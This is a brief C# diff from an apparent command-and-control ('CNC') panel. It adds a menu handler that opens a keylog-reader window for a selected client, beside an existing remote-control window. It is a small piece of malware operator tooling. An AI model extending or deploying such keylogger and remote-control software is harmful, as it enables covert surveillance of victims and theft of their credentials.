@@ -107,6 +107,12 @@ namespace CNC
             remoteControllWindow.Show();
         }
 
+        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            KeyloggReader keylogReaderWindow = new KeyloggReader((Client)clientListView.FocusedItem.Tag);
+            keylogReaderWindow.Show();
+        }
+
         //Multi select BELOW
 
 
